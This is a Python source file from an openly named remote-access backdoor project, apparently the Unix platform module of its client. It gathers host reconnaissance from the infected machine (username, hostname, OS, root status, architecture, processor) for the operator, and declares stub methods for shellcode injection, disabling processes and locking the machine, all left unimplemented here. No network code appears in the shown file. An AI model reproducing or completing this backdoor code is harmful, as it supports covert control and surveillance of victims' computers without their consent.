"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox
"""
import ctypes
import os
import platform
import socket

from src.client.control.control import Control


class Unix(Control):
    def get_info(self):
        _hostname = socket.gethostname()
        _platform = f"{platform.system()} {platform.release()}"

        info = {"username": os.environ["USER"], "hostname": _hostname, "platform": _platform,
                "is_admin": bool(os.geteuid() == 0), "architecture": platform.architecture(),
                "machine": platform.machine(), "processor": platform.processor(),
                "x64_python": ctypes.sizeof(ctypes.c_voidp) == 8, "is_unix": True}

        return info

    def inject_shellcode(self, buffer):
        raise NotImplementedError

    def toggle_disable_process(self, process, popup):
        raise NotImplementedError

    def lock(self):
        raise NotImplementedError
